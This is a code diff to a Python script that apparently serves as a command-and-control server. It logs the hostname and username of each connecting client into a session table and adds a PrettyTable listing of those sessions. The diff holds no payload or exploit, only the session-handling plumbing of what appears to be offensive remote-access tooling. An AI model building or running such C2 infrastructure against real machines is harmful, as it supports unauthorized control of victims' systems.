@@ -13,6 +13,7 @@ import signal
 from datetime import datetime, date
 from OpenSSL import crypto, SSL
 from os import path
+from prettytable import PrettyTable
 
 readline.parse_and_bind("tab: complete")
 CLIENT_DICT = {}
@@ -67,6 +68,7 @@ class myHandler(BaseHTTPRequestHandler):
         if (client not in CLIENT_DICT):
             hostname = base64.b64decode(json_response["hostname"]).decode('utf-8')
             username = base64.b64decode(json_response["cuser"]).decode('utf-8')
+            
             if len(CLIENT_DICT) == 0:
                 CLIENT_DICT[client] = {"session":1, "hostname":hostname, "username":username}
             else:
@@ -74,7 +76,6 @@ class myHandler(BaseHTTPRequestHandler):
 
         if len(CLIENT_DICT) == 1:
             global CURRENT_CLIENT
-            #CURRENT_CLIENT = str(list(CLIENT_DICT.keys())[list(CLIENT_DICT.values()).index(int(next(iter(CLIENT_DICT.values()))))])
             CURRENT_CLIENT = list(CLIENT_DICT.keys())[0] 
 
     def parseResult(self):
@@ -260,15 +261,17 @@ class Certificate():
 def handler(signum, frame):
     pass
 
+def printSessionTable():
+    t = PrettyTable(["Session ID", "IP", "Username", "Hostname"])
+    for client in CLIENT_DICT.keys():
+        t.add_row([CLIENT_DICT[client]["session"], client, CLIENT_DICT[client]["username"], CLIENT_DICT[client]["hostname"]])
+    print(colored(t.get_string(title="Sessions"), "green"))
+
 def construct_menu(menu, server):
     if menu[0] == "sessions":
         #server.handle_request()
-        print(colored("------------------------------------------------------------------", "green"))
-        print(colored("Session\t\tIP\t\tUsername\tHostname", "green"))
-        for client in CLIENT_DICT:
-            print(colored("{}\t\t{}\t{}\t{}".format(CLIENT_DICT[client]["session"], client, CLIENT_DICT[client]["username"], CLIENT_DICT[client]["hostname"]), "green"))
-        print(colored("------------------------------------------------------------------", "green"))
-    
+        printSessionTable()
+
     if menu[0] == "exit":
         server.server_close()
         exit(0)
